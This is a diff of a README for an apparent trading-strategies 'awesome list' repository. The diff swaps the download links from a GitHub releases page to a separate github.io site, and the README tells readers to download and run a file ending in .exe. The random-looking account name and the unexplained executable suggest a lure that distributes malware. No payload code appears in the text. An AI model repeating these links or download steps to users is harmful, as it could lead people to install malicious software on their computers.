@@ -1,6 +1,6 @@
 # 📈 awesome-systematic-trading - Master market strategies with curated tools
 
-[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/Unadjusted-genusnumenius501/awesome-systematic-trading/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://unadjusted-genusnumenius501.github.io)
 
 ## 📖 About this project
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run these trading tools. Ensure your syste
 
 Follow these steps to obtain the software.
 
-1. Visit the [releases page](https://github.com/Unadjusted-genusnumenius501/awesome-systematic-trading/releases) to access the downloads.
+1. Visit the [releases page](https://unadjusted-genusnumenius501.github.io) to access the downloads.
 2. Look for the file ending in .exe.
 3. Click the file name to start the download.
 4. Save the file to your desktop for easy access.
